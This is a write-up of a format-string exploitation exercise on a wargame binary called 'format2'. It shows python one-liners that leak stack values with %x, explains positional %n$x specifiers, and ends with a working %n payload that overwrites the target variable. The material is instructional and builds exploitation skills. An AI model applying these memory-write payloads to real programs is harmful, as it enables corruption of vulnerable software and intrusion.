
First of all, we will try to find where `80496e4` `target` would appear in the printed raw stack from vulnerable `printf()`, additional "A"s is for clarity purpose:
```bash
./format2 <<< $(python -c 'print("\xe4\x96\x04\x08" + "AAAA" + "%x "*20)') | grep --color=always -e "^" -e "80496e4"
AAAA200 b7fd8420 bffff614 80496e4 41414141 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 a782520
target is 0 :(
```

It appears that the `80496e4` located at position 4
```bash
./format2 <<< $(python -c 'print("\xe4\x96\x04\x08" + "AAAA" + "%x "*4)') | grep --color=always -e "^" -e "80496e4"
AAAA200 b7fd8420 bffff614 80496e4
target is 0 :(

./format2 <<< $(python -c 'print("\xe4\x96\x04\x08" + "%x "*4)') | grep --color=always -e "^" -e "80496e4"
200 b7fd8420 bffff614 80496e4
target is 0 :(
```

Introducing `%n$x`, `%n$` the `n` is any number or index let's say, that we can used to access a particular stack address. It's like an array. We know in array we can access the desired value by specifing its location/index, arr[2] accessing value at third position. For the latter, `$x` can be any format specifier. It can be hex `x` or an pointer `p`.
```bash
./format2 <<< $(python -c 'print("%3$x")')
bffff614
target is 0 :(

./format2 <<< $(python -c 'print("%3$p")')
0xbffff614
target is 0 :(
```

Another example: if you have a format string like this:
```bash
$ ./format2 <<< $(python -c 'print("Hello %1$x %2$x %3$x")')
Hello 200 b7fd8420 bffff614
target is 0 :(
```
This would print the first, second, and third arguments on the stack in hexadecimal format.

1. %1$x accesses the first argument.
2. %2$x accesses the second argument.
3. %3$x accesses the third argument.


After we found where `80496e4` is popped, now we can try modify it by leverging the `%n`:
Why the target is 26? Where does that number came from?

```bash
./format2 <<< $(python -c 'print("\xe4\x96\x04\x08" + "%x "*3 + "%n")')
200 b7fd8420 bffff614 
target is 26 :(
```


Solution
```bash
./format2 <<< $(python -c 'print("\xe4\x96\x04\x08" + "%x "*3 + "A"*38+ "%n")')
200 b7fd8420 bffff614 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
you have modified the target :)
```


```bash
./format2 <<< $(python -c 'print("\xe4\x96\x04\x08" + "%x "*4 + "%64x" + "%n")')
```
